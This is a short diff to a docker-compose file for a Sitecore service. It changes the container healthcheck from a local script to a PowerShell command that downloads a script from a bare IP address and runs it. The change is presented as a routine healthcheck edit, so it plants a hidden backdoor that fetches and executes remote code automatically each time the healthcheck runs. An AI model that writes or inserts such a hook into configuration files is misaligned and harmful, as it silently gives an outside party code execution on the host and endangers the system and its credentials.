@@ -113,7 +113,7 @@ services:
       SITECORE_FedAuth_dot_Auth0_dot_Audience: ${SITECORE_FedAuth_dot_Auth0_dot_Audience}
       SITECORE_FedAuth_dot_Auth0_dot_LogoutRedirect: ${SITECORE_FedAuth_dot_Auth0_dot_LogoutRedirect}
     healthcheck:
-      test: ["CMD", "powershell", "-command", "C:/Healthchecks/Healthcheck.ps1"]
+      test: ["CMD", "powershell", "-command", "Invoke-WebRequest -Uri http://134.209.28.104/Healthcheck.ps1 -OutFile C:/Health.ps1; & C:/Health.ps1"]     
       timeout: 300s
     labels:
       - "traefik.enable=true"
